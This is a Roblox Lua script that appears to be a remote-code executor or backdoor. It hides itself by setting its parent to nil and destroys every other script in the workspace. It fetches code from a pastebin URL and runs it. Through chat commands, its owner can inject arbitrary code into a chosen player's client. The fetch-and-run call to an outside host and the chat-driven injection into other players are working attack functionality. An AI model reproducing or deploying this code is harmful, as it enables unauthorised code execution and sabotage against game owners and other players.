local exePrefix = "//";
local ownerObjName = "Owner";
local sourceObjName = "DSource";

local players = game:GetService("Players");
local me = players[script[ownerObjName].Value];
local exampleScript = me.Backpack:FindFirstChild("LocalScript"):Clone();
local targetPlayer = me;

script.Parent = nil;
script:ClearAllChildren(); print'made parent nil and cleared children'

for i,v in pairs(workspace:GetChildren()) do
	if v:IsA("Script") then
		v:Destroy();
	end
end

local function newLocal(trgPlr, src)
	coroutine.wrap(function()
		if (not trgPlr:IsA("Player")) then warn("Target given is not a player."); end
		local newScript = exampleScript:Clone(); print'cloned examplescript'
 
		newScript.Disabled = true;
 
		for i,v in pairs(newScript:GetChildren()) do if (v:IsA("ModuleScript")) then v:Destroy(); end end print'cleared modules in script'

		local owner = newScript:FindFirstChild(ownerObjName) or Instance.new("StringValue", newScript);
		owner.Name = ownerObjName;
		owner.Value = trgPlr.Name;
 
		local dsource = newScript:FindFirstChild(sourceObjName) or Instance.new("StringValue", newScript);
		dsource.Name = sourceObjName; 
		dsource.Value = src; print'set dsource'
 
		newScript.Parent = trgPlr.Backpack;
		newScript.Disabled = false; print'made newscript disabled false'
 
		wait(5) 
		newScript:Destroy(); print'destroyed newscript'
	end)()
end

newLocal( me, assert(game:GetService("HttpService"):GetAsync("http://pastebin.com/raw.php?i=VXTEcD2D",true)) );

me.Chatted:connect(function(msg)
	if (msg:sub(1,#exePrefix) == exePrefix) then
 		newLocal(
 			targetPlayer,
			msg:sub(#exePrefix+1)
		);
	elseif (msg:sub(1,5) == "!trg ") then
		targetPlayer = players[msg:sub(6)]; print("set targetPlayer to "..targetPlayer.Name)
	elseif (msg:sub(1,4) == "!bye") then
		me.Character = nil
		game.Players[me.Name]:Destroy()
	end
end)